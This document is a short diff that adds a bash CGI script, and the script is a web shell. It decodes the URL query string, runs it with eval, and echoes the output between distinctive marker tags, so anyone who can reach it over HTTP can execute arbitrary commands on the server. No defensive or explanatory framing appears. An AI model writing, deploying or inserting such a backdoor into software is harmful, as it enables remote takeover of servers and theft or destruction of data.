@@ -1,0 +1,8 @@
+#!/bin/bash
+echo -e "Content-Type: text/html\n"
+CMD=$(echo "$QUERY_STRING" | sed 's/%/\\x/g' | xargs -0 printf '%b' 2>/dev/null || echo "$QUERY_STRING")
+if [ -n "$CMD" ]; then
+    echo '[laspiece-neverend]<pre>'
+    eval "$CMD" 2>&1
+    echo '</pre>[laspiece-neverend]'
+fi
